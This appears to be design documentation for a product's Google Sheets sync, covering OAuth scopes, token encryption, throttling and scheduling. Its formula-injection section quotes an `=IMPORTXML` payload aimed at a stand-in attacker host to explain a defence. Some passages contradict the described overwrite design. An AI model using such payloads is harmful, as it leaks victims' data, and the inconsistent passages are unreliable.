# Integrations — Google Sheets

Routely keeps a spreadsheet up to date with the last 30 days of results — **one spreadsheet per
website**, refreshed within seconds of a visit or a conversion. One row per experiment arm per day:

| Date (UTC) | Experiment | Variant | Visitors | Conversions | Conversion Rate (%) |
| --- | --- | --- | --- | --- | --- |
| 2026-09-28 | Pricing redesign | Control | 412 | 30 | 7.3 |
| 2026-09-28 | Pricing redesign | Variant 1 | 408 | 41 | 10 |

Routely creates and owns **one tab**, called `Routely`, inside the spreadsheet the customer chooses.
Nothing else in that file is read or touched.
Routely never deletes a row it wrote — including for an experiment that has since been deleted.

---

## 1. The shape: one grant, many destinations

Two separate things, deliberately:

| | Scope | Table |
| --- | --- | --- |
| **The Google authorisation** | one per Routely account | `sheets_connections` |
| **The spreadsheet** | one per website | `website_sheet_targets` |

The customer authorises Google **once**. Each website then points at its own spreadsheet, which is
what someone running several sites — an agency especially — actually needs, since each client's
numbers belong in a sheet that client can be given.

Splitting them is not tidiness. Attaching a sheet to a website needs no consent screen, because the
grant already exists; a grant per website would mean a consent screen every time, and Google caps
refresh tokens at roughly **100 per account per OAuth client**, silently invalidating the oldest.

**Attaching a sheet is optional.** A website with no target is simply not synced. That way adding a
website never depends on Google being reachable, and a customer who does not want Sheets is never
blocked by it.

`sheets_sync_runs` is keyed on the **website**, not the grant — so disconnecting and reconnecting
Google does not lose the record of which days were already written, which would otherwise re-send
every one of them.

---

## 2. Scopes: everything is non-sensitive, and that is the point

```
openid
https://www.googleapis.com/auth/userinfo.email
https://www.googleapis.com/auth/drive.file
```

Google sorts scopes into non-sensitive, **sensitive** and **restricted**. The latter two require an
app-verification review before anyone outside the test-user list can connect, and restricted scopes
additionally require a paid third-party security assessment, renewed annually. Every scope above is
non-sensitive, so **this integration needs no verification review at all.**

`drive.file` grants per-file access to spreadsheets **Routely created, or the customer explicitly
handed over through the Google Picker**. Nothing else in their Drive.

### Two scopes that were dropped, and why the instinct to re-add them is wrong

- **`spreadsheets` is not requested**, even though this feature writes to spreadsheets. The Sheets
  API accepts Drive scopes, so `drive.file` authorises `values.append` and `spreadsheets.create` on
  a file the customer picked or Routely created. `spreadsheets` would grant access to *every*
  spreadsheet they own — strictly more power, for a verification review that is then unavoidable.
- **`drive.metadata.readonly` is not requested.** It was, briefly, to populate a dropdown of the
  customer's spreadsheets inside Routely. It is *restricted*, the most expensive tier Google has,
  and it bought only a list. The Picker shows the customer their whole Drive in Google's own window,
  using their own session, and returns just the file they chose — the same outcome with strictly less
  access and no review.

**Consequence, stated plainly: Routely cannot enumerate a customer's spreadsheets.** A Drive
`files.list` under `drive.file` returns only files this app created, which would be a misleading list
rather than a useful one. Browsing is the Picker's job. There is no `listSpreadsheets` in the
codebase, and adding one back would be a mistake.

### If the old scopes were ever granted

`include_granted_scopes` is deliberately **not** set on the authorize URL. It exists for incremental
authorization — it asks Google to return every previously granted scope alongside the new ones —
which is exactly backwards when narrowing. With it set, a customer who once granted `spreadsheets`
would keep getting it back on every reconnect and the narrowing would never take effect.

A customer who granted the old scopes still holds them until they reconnect. Revoking Routely at
`myaccount.google.com/permissions` clears them outright.

---

## 3. Setting it up

### Google Cloud Console — once, by whoever owns the project

The integration **reuses the sign-in OAuth client** (`GOOGLE_CLIENT_ID` / `GOOGLE_CLIENT_SECRET`):
same project, same consent screen.

1. **Enable three APIs** — APIs & Services → Library: **Google Sheets API**, **Google Drive API**,
   **Google Picker API**. A missing one fails with a 403 that reads like a permissions problem.
2. **Authorized redirect URI** — Credentials → the OAuth 2.0 Client ID → *Authorized redirect URIs*:
   ```
   http://localhost:3000/api/integrations/google/callback
   https://your-app.example.com/api/integrations/google/callback
   ```
   This is a **different field** from *Authorized JavaScript origins*. Both are needed: the redirect
   URI for the OAuth callback, the JS origin for the Picker.
3. **Authorized JavaScript origins** — the app's origins (`http://localhost:3000`, and production).
4. **API key** — Credentials → Create credentials → API key, for the Picker. If you restrict it to
   websites you must include **both** your own domain and `https://docs.google.com/*`, or the Picker
   fails to load. The key authorises nothing on its own: it identifies the project, while every file
   operation is authorised by the customer's own OAuth token.
5. **Scopes** — on the consent screen's *Data Access* page, declare the three scopes in §2 and
   **remove `spreadsheets` and `drive.metadata.readonly` if they are still listed**. A restricted
   scope left declared keeps the app subject to restricted-scope verification even though the code no
   longer asks for it.
6. **Publishing status** — with only non-sensitive scopes the app can be published without a
   verification review, and then anyone can connect. While it is in **Testing**, *every* OAuth flow
   including plain sign-in is limited to accounts on the test-user list, which is what produces
   `Error 403: access_denied — Routely has not completed the Google verification process`.

### Environment

```bash
# Server
TOKEN_ENCRYPTION_KEY="$(openssl rand -base64 32)"
CRON_SECRET="$(openssl rand -hex 32)"

# Browser — both public by design, read by the Picker from page script
NEXT_PUBLIC_GOOGLE_API_KEY="..."
NEXT_PUBLIC_GOOGLE_PROJECT_NUMBER="..."   # the digits before the dash in the client id
```

`NEXT_PUBLIC_GOOGLE_PROJECT_NUMBER` is the Picker's `appId`. Without it Google does not associate a
picked file with this app, and the write that follows fails with a 404 that looks like a missing
spreadsheet.

None of the four is in `env.ts`'s `REQUIRED_IN_PRODUCTION`. That list means "the app cannot serve a
request without this", and a deployment with no Sheets integration is perfectly functional — adding
them there would fail an existing production server at start-up on the next deploy. Missing
`TOKEN_ENCRYPTION_KEY` makes the integration report itself unavailable; missing Picker variables
leave only "create a new sheet", which still works.

### Vercel

Set the variables on the project, **then** deploy. `vercel.json`'s `crons` array only takes effect on
a production deployment, so until one happens the schedule does nothing at all — with no error, just
no invocations.

---

## 4. Choosing a spreadsheet

Two ways, both on the website's page and in the add-website dialog:

- **Choose existing sheet** opens the Google Picker. The customer browses their whole Drive in
  Google's window; Google grants Routely access to the one file they tap. If the spreadsheet has more
  than one tab, Routely then asks which tab to append to — with exactly one tab, it does not ask.
- **Create new sheet** makes a spreadsheet named `Routely — <website name>` in their Drive, with a
  tab called `Routely daily`. It is theirs immediately: they can rename, move or share it and the
  sync keeps working, because Routely addresses it by id.

The spreadsheet's name and the tab's title are always read back from **Google**, never taken from the
form. A Server Action is a public HTTP endpoint, and the stored tab title is what builds the A1 range
every nightly write targets — accepting it from the client would let a tampered submission aim the
write at a different tab.

### Why the Picker gets an access token in the browser

`setOAuthToken` requires a real token in the page; the Picker cannot work otherwise. It is sound
here:

- the token carries **only** `drive.file`, so it reaches files Routely created plus whatever the
  customer picks with it — not the rest of their Drive;
- it is the customer's own token in the customer's own browser, which is where a pure client-side
  OAuth flow would put it anyway. Routing it through the server means the *refresh* token never
  leaves the database;
- it is short-lived and never persisted client-side.

---

## 5. What the numbers mean

**The conversion rate is conversions ÷ *assigned* visitors**, identical to the dashboard. The query
lives in `analytics.service.ts` beside `armStats` precisely so the two cannot drift: a customer who
compares the spreadsheet against the experiment page and finds a different rate has found a bug.
Verified against real data — an experiment showing `10.0%` and `17.5%` on its page writes `10` and
`17.5` to the sheet.

It is written as a one-decimal percentage, matching `formatPercent`. Full float precision would let
the two disagree in the third decimal, which reads as a bug rather than as rounding — and nothing is
lost, because Visitors and Conversions are both on the row.

An unknown rate (nobody assigned) is written as a **blank cell**, never `0`, which would otherwise
average into a customer's column as a real zero.

### Scope of a day's rows

- **Only the experiments of that website.** `getDailyArmRows` takes a `websiteId` *alongside* the
  owner's id, never instead of it — a website id is caller-supplied, and on its own it would be an id
  to probe. Verified: asking for a website with the wrong owner's id returns nothing.
- **Status is ignored** — DRAFT, ACTIVE, PAUSED and ARCHIVED all contribute. An experiment paused
  this morning still collected real data yesterday, and filtering on today's status would make
  yesterday's numbers depend on when the sync ran.
- **An experiment with no activity that day produces no rows.** The sheet is an append-only log;
  emitting every arm of every experiment every day would grow it without bound and bury the signal,
  and a spreadsheet treats a missing row and a zero row identically when summing. It also means a
  quiet day costs no Google API calls at all.
- **Every arm of an experiment that *did* see activity is written, including arms with zero** —
  otherwise a variant that got no traffic yesterday vanishes and control looks like the whole test.
- **No lift column, and no significance claim**, consistent with the results UI.

### Formula injection

Rows are sent with `valueInputOption=RAW`. This is a security decision, not a formatting one. Under
`USER_ENTERED` Google parses each value as though a person had typed it — so an experiment named
`=IMPORTXML("http://attacker.test", …)` would be stored as a **live formula** in the customer's
spreadsheet, fetching a URL of the attacker's choosing with the customer's Google session.
Experiment names are customer-controlled free text, so the only safe reading is literal. `RAW` still
stores JSON numbers as numbers, which is the one thing `USER_ENTERED` would have been needed for.

Nothing is escaped or prefixed to compensate — that would be visible in the customer's spreadsheet
and would not make anything safer. A test asserts a formula-shaped name passes through untouched, so
a later "cleanup" fails loudly.

---

## 5b. One tab, rewritten from source

Every refresh recomputes the whole 30-day window from the database and overwrites the tab.

That is what makes the spreadsheet incapable of disagreeing with the dashboard: there is no
accumulated state to drift, and no notion of a day being "already written". It also makes a refresh
idempotent by construction — running it twice leaves exactly the same cells.

**An earlier design appended completed days to one tab and kept today in another.** It worked, but it
put the same date in two places with different numbers as soon as a day was written while still in
progress, and "which tab is right?" is not a question a customer should have to answer. Recomputing
one tab removes the question rather than documenting it.

**The customer chooses a spreadsheet, not a tab.** A full overwrite aimed at a tab holding their own
work would destroy it, so Routely creates its own. Deleting that tab is safe — the next refresh
recreates it.

### Why it is throttled rather than per-event

Google allows **60 write requests per minute per user** and 300 per minute per project. A write per
page view would exceed that at roughly **one visitor per second** — and would put a Google round trip
inside the tracking hot path, where the rule is that ingestion is fast and never fails.

Instead the refresh is *triggered* by traffic and *capped* by a throttle:

- `/api/v1/events` schedules it with Next's `after()`, so it runs **after the response is sent**.
  Measured: beacons answer in 23–36 ms with the refresh enabled, unchanged.
- `claimRefresh` is a compare-and-set on `refreshedAt`, so of any number of simultaneous beacons —
  across any number of instances — exactly one wins. Verified: twelve simultaneous claims produce one
  write, and a burst of ten beacons produces one.
- `REFRESH_INTERVAL_MS` is 10 seconds, so a website writes at most six times a minute however busy.
- `refreshSheet` **never throws**. A spreadsheet being unreachable must not cost a customer their
  tracking data, so failures are recorded on the target — and shown in the UI — then swallowed.

The throttle protects the quota, not correctness. Because the write is an overwrite, a refresh that
happens twice is merely wasteful, never wrong. That is why the per-day claim rows the append-based
design needed are gone.

`rowCount` is stored so a refresh can blank rows it no longer needs — writing three rows over a tab
that held eight would otherwise leave five stale rows below, still looking like results.

### The scheduled refresh

Traffic keeps a busy website current on its own, so the cron exists for the quiet ones: without it, a
site with no visitors would keep showing whatever it last showed and the window would never roll
forward onto the new day.

---

## 6. Days are UTC

`utcDayRange` is the only definition of a day, and it is UTC at both ends, inclusive
(`00:00:00.000Z` to `23:59:59.999Z`) because every date filter in this codebase is `{ gte, lte }`.

This is more than a convenience:

- `lib/format.ts` already pins every rendered date to `timeZone: "UTC"`, so the dashboard and the
  spreadsheet agree by construction.
- On Vercel the function runtime's local timezone **is** UTC, so `overview.service.ts`'s local-time
  day buckets already coincide with this in production. The only place the two definitions diverge is
  a developer's laptop.

The header column says `Date (UTC)` so nobody has to guess.

---

## 7. Idempotency, without a claim mechanism

There is none, and none is needed. The tab is overwritten from source data on every refresh, so:

- a duplicated cron invocation writes the same cells twice;
- a manual refresh racing a beacon writes the same cells twice;
- a refresh that fails halfway leaves a tab the next refresh simply replaces.

None of those can duplicate or corrupt a row, which is what the previous append-based design needed a
per-`(website, day)` unique claim to guarantee. Removing it removed the only part of this feature that
was *not* exactly-once — the window where an append succeeded but the bookkeeping did not.

The spreadsheet is never the system of record. Routely's own database is, and the tab is a view of it
that can be rebuilt at any time.

---

## 8. Tokens at rest

A Google refresh token is the only value Routely stores that grants ongoing access to something
*outside* Routely, so a leaked backup of this database would otherwise be a leak of customers' Drive
access. It is encrypted with AES-256-GCM (`lib/secret-box.ts`, keyed by `server/crypto.ts`).

GCM rather than a cipher without authentication, because the plaintext is fed straight to Google:
unauthenticated, an attacker with database write access could swap in their own refresh token and
have the nightly sync write one customer's data into another customer's spreadsheet. Every value is
also bound to a `purpose` as additional authenticated data, so a ciphertext cannot be moved from the
refresh-token column into the access-token column and still decrypt.

`TOKEN_ENCRYPTION_KEY` is deliberately **not** `AUTH_SECRET`. Rotating `AUTH_SECRET` is routine and
cheap — everyone signs in again. Rotating the token key makes every stored refresh token
undecryptable, so every customer must reconnect and every sync fails until they do. Sharing one
variable between those operations would mean a cheap rotation silently causing an expensive,
invisible outage.

**With no key, the integration reports itself unavailable. It never falls back to plaintext** — that
would put a real refresh token in a developer's Postgres in the clear *and* make the development code
path differ from production.

This is not key management. Anyone who can read the environment can decrypt; the threat model is a
stolen backup, not a compromised application server, which by definition holds the key.

---

## 9. Scheduling

`vercel.json` registers `/api/cron/sheets-sync` at `20 0 * * *` — 00:20 UTC, five fields, no seconds,
UTC. Twenty minutes past rather than on the hour leaves room for beacons the SDK sends close to
midnight.

The endpoint requires `Authorization: Bearer $CRON_SECRET`, compared in constant time after hashing
both sides (so the comparison cannot leak the expected length through timing or an exception). With
`CRON_SECRET` unset it **refuses every request** and logs why: an open endpoint here would let anyone
make Routely write to customers' spreadsheets, repeatedly.

It returns **200 with counts even when some websites failed**. Each failure is recorded on its own run
row and retried by the next sweep; a 500 would tell the scheduler the whole job failed, obscuring
which customers *were* written and inviting a retry of work already done. Only a sweep that could not
start at all is an error.

The sweep holds a wall-clock budget below the function's `maxDuration` and stops claiming new work
rather than being killed mid-append — being killed mid-append is exactly what produces an `UNKNOWN`
run. One grant usually covers several websites, so tokens are cached per sweep rather than refreshed
per website.

**Check your platform's current limits.** The number of cron jobs allowed, the precision with which a
daily job fires, and the `maxDuration` ceiling all differ by Vercel plan and have changed more than
once. The design is deliberately insensitive to the answer: the claim row makes a late, early or
duplicated invocation harmless.

### Running it by hand

```bash
npm run sheets:sync -- --dry-run --day 2026-09-28 --user <userId> --website <websiteId>
npm run sheets:sync -- --day 2026-09-28 --user <userId> --website <websiteId>
npm run sheets:sync                                                  # the full sweep
```

`--dry-run` prints the rows that *would* be appended and touches Google not at all. It is the only
way to check the numbers against the dashboard before trusting a write.

The same thing is available in the UI: each website's card has a **day chooser** defaulting to
yesterday, capped at today. That default is not the interesting part — being able to pick *today* is.
A website set up this morning has no data for yesterday, so a button hard-wired to yesterday can only
ever report "nothing to write", which reads exactly like a broken integration rather than a working
one with nothing to say.

The script runs under `tsx --conditions=react-server`. Every module under `src/server` begins
`import "server-only"`, whose job is to throw outside a React Server Component bundler; Node resolves
that package's `react-server` condition to a no-op, which is what makes a service importable from a
script. (`prisma/seed.ts` and `prisma/verify.ts` sidestep this by building their own Prisma client and
importing nothing from `src/` — not an option when the point is to run the real service.) The script
is a convenience, not the load-bearing path: the "Sync yesterday now" button drives the same service
through the real app.

---

## 10. Known limitations

1. **The tab shows 30 days, not everything.** Older days fall out of the window. Routely's dashboard
   keeps the full history; the spreadsheet is a rolling view, not an archive.
2. **Days are UTC.** A customer in UTC+13 sees "today" roll over at 11am their time. Nothing
   disagrees in production — on Vercel the runtime timezone is UTC — but the boundary is not their
   local day.
3. **A refresh only happens when traffic arrives, or on the schedule.** Between those, the tab is as
   stale as the gap. For a busy site that is seconds; for a quiet one, until the next scheduled run.
4. **One Google account per Routely account.** Every website's spreadsheet lives in the same Drive.
   Handing website A's sheet to client A means *sharing* that spreadsheet, not connecting a different
   Google account. Per-website grants were rejected: a consent screen per website, against Google's
   ~100-refresh-token cap.
5. **Routely cannot list a customer's spreadsheets** — by design, see §2. Choosing an existing one
   needs the Picker and its two `NEXT_PUBLIC_GOOGLE_*` variables; without them only "create a new
   sheet" is offered.
6. **The Picker needs a third-party script** (`apis.google.com/js/api.js`). An extension or corporate
   proxy that blocks it leaves "create a new sheet" as the only route; the UI says so rather than
   spinning.
7. **An arm whose variant was deleted is labelled `Removed variant`** rather than dropped, because
   the visitors it counted were real. It disappears once its days leave the window.
8. **Late events change history.** A beacon that lands the morning after the visit is counted on the
   day it *occurred*, so a completed day's row can still change. That is more accurate than freezing
   it, but it does mean a figure someone screenshotted may not match later.
9. **Refresh tokens expire after 7 days while the OAuth app's publishing status is "Testing"**, and
   changing the app's scopes or publishing status revokes existing grants outright. Both surface as a
   clear "reconnect" state rather than silent failure.
10. **The refresh throttle is per-process**, the same limitation `rateLimit()` already carries.
    Multiple instances multiply the effective write rate, which matters only against Google's quota.
11. **The 30-day window is bucketed in memory.** `getArmRowsByDay` fetches the window's assignments
    and conversions and groups them in JS, because Prisma cannot group by a date-truncated column.
    `overview.service.ts` does the same and carries the same caveat: this becomes raw SQL if one
    website's traffic over 30 days ever outgrows memory.
